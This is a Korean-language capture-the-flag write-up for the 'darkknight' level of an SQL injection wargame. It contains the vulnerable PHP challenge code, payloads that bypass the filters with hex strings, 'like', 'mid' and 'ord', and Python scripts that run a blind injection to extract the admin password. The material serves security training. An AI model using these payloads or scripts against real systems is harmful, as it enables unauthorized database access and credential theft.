# darkknight

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- GET 파라미터 `no`에서는 `'`, `substr`, `ascii`, `=`을 필터링 한다.
- admin의 정확한 pw를 알아야 한다.

## 3. Solution
python 스크립트를 이용해 blind-sqlinjection 한다.

a. pw의 길이
b. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`no` | 1234 or id like 0x61646d696e and length(pw) like `i`


small quotes가 필터링 되고 있기에, 문자열 'admin'은 hex값으로 전달하였다.<br>
'admin' &rarr; 0x61646d696e


이후, 비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?\
            no=1234 or id like 0x61646d696e %%26%%26 length(pw) like %d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`no` | 1234 or id like 0x61646d696e and ord(mid(pw,i,1)) like j #


마찬가지로 admin은 hex값에, `ascii`, `substr`은 각각 `ord`와 `mid`로 우회하였다.

a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?\
            no=1234 or id like 0x61646d696e %%26%%26 length(pw) like %d" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?\
                no=1234 or id like 0x61646d696e %%26%%26 ord(mid(pw,%d,1)) like %d" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 0
pw(2) : 0b
pw(3) : 0b7
pw(4) : 0b70
pw(5) : 0b70e
pw(6) : 0b70ea
pw(7) : 0b70ea1
pw(8) : 0b70ea1f
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | 0b70ea1f